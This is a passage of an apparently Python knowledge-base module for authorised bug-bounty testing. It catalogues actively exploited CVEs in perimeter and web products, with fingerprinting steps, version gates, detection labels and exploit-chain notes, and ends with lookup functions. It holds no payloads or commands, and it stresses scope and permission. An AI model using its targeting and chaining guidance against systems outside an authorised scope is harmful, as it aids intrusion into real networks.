            "Fingerprint produk Atlassian (Jira/Confluence/Bamboo) dan versi build dari halaman about/footer/API",
            "Gate versi advisori; kelas bug = endpoint file/directory yang bisa diakses anonim — cek daftar path dari advisori, bukan tebakan",
        ],
        "detection": "external_accessible_file_endpoint_returns_internal_content",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "AhsayCBS improper authentication + command injection chain (KEV)",
        "cve": "CVE-2026-105133",
        "vulnerability_class": "auth-bypass",
        "pattern": "kev_ahsay_auth_then_cmdi",
        "description": "CISA KEV 2026-10-14 pasangan CVE pada AhsayCBS backup: CVE-2026-105133 improper authentication + CVE-2026-105134 command injection — chain auth-bypass -> RCE terbukti dieksploitasi berpasangan",
        "affected_components": ["Ahsay AhsayCBS"],
        "companion_cve": "CVE-2026-105134",
        "technique": [
            "Fingerprint panel AhsayCBS (port/path login khas backup) pada aset ter-scope",
            "Gate versi advisori vendor; dua kelas terpisah = dua control failure, hitung terpisah; chain hanya bila replay end-to-end dari state bersih",
        ],
        "detection": "auth_bypass_reaches_authenticated_context_then_cmd_marker_executes",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
        "chain_potential": "improper auth -> command injection -> RCE host backup (dampak massal: kredensial backup)",
    },
    {
        "name": "Cisco Secure Email Gateway path traversal (KEV)",
        "cve": "CVE-2026-76519",
        "vulnerability_class": "misconfig",
        "pattern": "kev_cisco_seg_path_traversal",
        "description": "CISA KEV 2026-10-14: relative path traversal pada Cisco SEG. Saudara: CVE-2026-76461 SQLi pada produk yang sama (KEV 2026-09-14) — dua kelas di satu produk perimeter",
        "affected_components": ["Cisco Secure Email Gateway"],
        "companion_cve": "CVE-2026-76461",
        "technique": [
            "Fingerprint SEG (panel management, header khas IronPort-class)",
            "Gate versi advisori; uji kelas traversal dan SQLi sebagai hipotesis terpisah dengan kontrol masing-masing",
        ],
        "detection": "traversal_or_sqli_differential_on_affected_version",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Palo Alto PAN-OS code injection (KEV)",
        "cve": "CVE-2026-0322",
        "vulnerability_class": "rce",
        "pattern": "kev_pan_os_code_injection",
        "description": "CISA KEV 2026-10-14: code injection pada PAN-OS — dieksploitasi aktif",
        "affected_components": ["Palo Alto Networks PAN-OS"],
        "technique": [
            "Fingerprint PAN-OS versi dari header/panel management pada aset perimeter ter-scope",
            "Gate versi advisori vendor; kelas code injection pada perimeter = butuh izin eksplisit engagement untuk PoC aktif",
        ],
        "detection": "version_in_vendor_affected_range_plus_injection_context_anomaly",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Ivanti Connect Secure authentication bypass by spoofing (KEV)",
        "cve": "CVE-2026-104935",
        "vulnerability_class": "auth-bypass",
        "pattern": "kev_ivanti_connect_secure_spoof",
        "description": "CISA KEV 2026-10-13: authentication bypass by spoofing pada Ivanti Connect Secure (VPN perimeter)",
        "affected_components": ["Ivanti Connect Secure"],
        "technique": [
            "Fingerprint ICS (panel /dana atau header khas) pada aset perimeter ter-scope",
            "Gate versi advisori; versi patched = buang, jangan paksa",
        ],
        "detection": "version_in_vendor_affected_range_plus_auth_context_anomaly",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Zammad session fixation + improper privilege management (KEV)",
        "cve": "CVE-2026-102489",
        "vulnerability_class": "auth-bypass",
        "pattern": "kev_zammad_session_fixation_chain",
        "description": "CISA KEV 2026-10-02 pasangan Zammad (ticket system web-app, mungkin muncul di program gov): CVE-2026-102489 session fixation + CVE-2026-102490 improper privilege management",
        "affected_components": ["Zammad"],
        "companion_cve": "CVE-2026-102490",
        "technique": [
            "Fingerprint Zammad (path /api/v1, footer helpdesk) di web target",
            "Session fixation kelas klasik: set session id sebelum login, buktikan sesi id itu hidup setelah login pada akun tes sendiri",
            "Privilege management: uji transisi role pada akun tes; kelas bug berbeda, laporan terpisah",
        ],
        "detection": "attacker_chosen_session_id_survives_login_or_privilege_transition_accepted",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "High",
        "chain_potential": "fixation -> victim login di id attacker -> akses tiket PII -> priv-manage eskalasi",
    },
    {
        "name": "Adobe Commerce/Magento SSTI in template content (KEV)",
        "cve": "CVE-2026-75650",
        "vulnerability_class": "ssti",
        "pattern": "kev_magento_template_injection",
        "description": "CISA KEV 2026-09-08: improper neutralization pada template engine Adobe Commerce/Magento — dieksploitasi aktif",
        "affected_components": ["Adobe Commerce", "Magento Open Source"],
        "technique": [
            "Fingerprint Magento (path checkout, theme paths, X-Magento-* headers)",
            "Gate versi + hak akses admin biasanya prasyarat template edit — tanpa akun yang memenuhi, status blocked jujur",
        ],
        "detection": "template_expression_evaluated_in_render_context",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Adobe Commerce/Magento incorrect authorization (KEV)",
        "cve": "CVE-2026-71362",
        "vulnerability_class": "authorization",
        "pattern": "kev_magento_authz",
        "description": "CISA KEV 2026-09-24: incorrect authorization pada Adobe Commerce/Magento",
        "affected_components": ["Adobe Commerce", "Magento Open Source"],
        "technique": [
            "BOLA/BFLA matriks dua akun pada endpoint admin/API storefront; marker privat di objek akun tes",
        ],
        "detection": "cross_role_access_with_owner_marker_in_response",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "WordPress Core remote file inclusion (KEV)",
        "cve": "CVE-2026-87902",
        "vulnerability_class": "rce",
        "pattern": "kev_wp_core_rfi",
        "description": "CISA KEV 2026-09-25: remote file inclusion pada WordPress Core — dieksploitasi aktif",
        "affected_components": ["WordPress Core"],
        "technique": [
            "Fingerprint WP versi (generator meta, /wp-includes/, REST prefix) — kebanyakan instansi kena lewat plugin, jadi gate versi core DULU sebelum klaim",
            "WPScan/helper API untuk inventaris plugin rentan hanya sebagai hipotesis; bukti tetap dari target",
        ],
        "detection": "version_in_vendor_affected_range_plus_include_context_marker",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Microsoft SharePoint code injection (KEV)",
        "cve": "CVE-2026-65660",
        "vulnerability_class": "rce",
        "pattern": "kev_sharepoint_code_injection",
        "description": "CISA KEV 2026-09-25: code injection pada SharePoint on-prem — dieksploitasi aktif",
        "affected_components": ["Microsoft SharePoint (on-premises)"],
        "technique": [
            "Fingerprint SharePoint on-prem (/_layouts, /_api, X-SharePointHealthScore) pada aset perimeter ter-scope",
            "Gate versi advisori; kelas RCE perimeter = izin eksplisit untuk PoC aktif",
        ],
        "detection": "version_in_vendor_affected_range_plus_injection_context_anomaly",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "Critical",
    },
    {
        "name": "Starlette HTTP request/response smuggling (KEV)",
        "cve": "CVE-2026-48710",
        "vulnerability_class": "misconfig",
        "pattern": "kev_starlette_smuggling",
        "description": "CISA KEV 2026-09-02: HTTP request/response smuggling pada Kludex Starlette (ASGI framework Python) — relevan untuk stack Python/FastAPI di balik proxy",
        "affected_components": ["Kludex Starlette"],
        "technique": [
            "Kelas desync = efek lintas-request; jalankan HANYA di lab terisolasi atau izin eksplisit (bisa mengenai request user lain)",
            "Di bounty produksi: fingerprint versi Starlette dari respons error/Sourcemap + cocokkan rentang advisori, status hypothesis",
        ],
        "detection": "desync_artifact_in_isolated_lab_or_version_gate_match",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "High",
    },
    {
        "name": "Strapi cleartext storage of sensitive information (KEV)",
        "cve": "CVE-2023-22894",
        "vulnerability_class": "misconfig",
        "pattern": "kev_strapi_cleartext_storage",
        "description": "CISA KEV 2026-10-08 (CVE lama 2023 masuk KEV baru): cleartext storage pada Strapi — contoh bahwa umur CVE bukan filter; target EOL/unpatched tetap kandidat",
        "affected_components": ["Strapi"],
        "technique": [
            "Fingerprint Strapi (path /admin, /content-manager, X-Powered-By) dan versi",
            "Kelas disclosure: buru artifact cleartext (response/api yang mengekspos secret) pada versi terdampak; tanpa artifact = candidate",
        ],
        "detection": "cleartext_secret_in_response_or_storage_artifact",
        "sources": ["cisa_kev_catalog_2026.10.16", "run_20261017T122621Z"],
        "severity": "High",
    },
]

# ============================================================================
# INTELLIGENCE AGGREGATOR
# ============================================================================

def _build_all_patterns() -> List[Dict[str, Any]]:
    patterns = []
    patterns.extend(AUTHORIZATION_BYPASS_PATTERNS)
    patterns.extend(SQL_INJECTION_PATTERNS)
    patterns.extend(XSS_BYPASS_PATTERNS)
    patterns.extend(SSRF_PATTERNS)
    patterns.extend(GRAPHQL_PATTERNS)
    patterns.extend(CISA_KEV_PATTERNS)
    patterns.extend(FILE_UPLOAD_BYPASS_PATTERNS)
    patterns.extend(RACE_CONDITION_PATTERNS)
    patterns.extend(MODERN_ATTACK_SURFACE_PATTERNS)
    patterns.extend(FRESH_INTEL_2026_10_PATTERNS)
    return patterns


_ALL_PATTERNS = tuple(_build_all_patterns())
_BY_CLASS: Dict[str, tuple] = {}
for _pattern in _ALL_PATTERNS:
    _class = str(_pattern.get("vulnerability_class", "")).lower().replace("-", "_")
    if _class:
        _BY_CLASS.setdefault(_class, []).append(_pattern)
_BY_CLASS = {key: tuple(value) for key, value in _BY_CLASS.items()}


def get_all_patterns() -> List[Dict[str, Any]]:
    """Return all offensive patterns from the prebuilt intelligence index."""
    return list(_ALL_PATTERNS)


def get_patterns_by_class(vulnerability_class: str) -> List[Dict[str, Any]]:
    """Get patterns for specific vulnerability class."""
    vuln_class_lower = vulnerability_class.lower().replace("-", "_")
    matched = list(_BY_CLASS.get(vuln_class_lower, ()))
    seen = {id(pattern) for pattern in matched}
    for pattern in _ALL_PATTERNS:
        pattern_class = str(pattern.get("vulnerability_class", "")).lower().replace("-", "_")
        if vuln_class_lower and vuln_class_lower in pattern_class and id(pattern) not in seen:
            seen.add(id(pattern))
            matched.append(pattern)
    return matched


def get_patterns_by_component(component: str) -> List[Dict[str, Any]]:
    """Get patterns affecting specific component (deduplicated)."""
    component_lower = component.lower()
    matched: Dict[int, Dict[str, Any]] = {}
    for pattern in _ALL_PATTERNS:
        affected = pattern.get("affected_components", [])
        if any(component_lower in str(comp).lower() for comp in affected):
            matched[id(pattern)] = pattern
        if component_lower in str(pattern.get("name", "")).lower():
            matched[id(pattern)] = pattern
        if component_lower in str(pattern.get("description", "")).lower():
            matched[id(pattern)] = pattern
    return list(matched.values())


def get_cve_pattern(cve_id: str) -> Dict[str, Any]:
    """Get pattern for specific CVE (searched across every CVE-tagged section)."""
    for section in (CISA_KEV_PATTERNS, FRESH_INTEL_2026_10_PATTERNS):
        for pattern in section:
            if pattern.get("cve", "").upper() == cve_id.upper():
                return pattern
    return {}


__all__ = [
    "get_all_patterns",
    "get_patterns_by_class",
    "get_patterns_by_component",
    "get_cve_pattern",
    "AUTHORIZATION_BYPASS_PATTERNS",
    "SQL_INJECTION_PATTERNS",
    "XSS_BYPASS_PATTERNS",
    "SSRF_PATTERNS",
    "GRAPHQL_PATTERNS",
    "CISA_KEV_PATTERNS",
    "FILE_UPLOAD_BYPASS_PATTERNS",
    "RACE_CONDITION_PATTERNS",
    "MODERN_ATTACK_SURFACE_PATTERNS",
    "FRESH_INTEL_2026_10_PATTERNS",
]
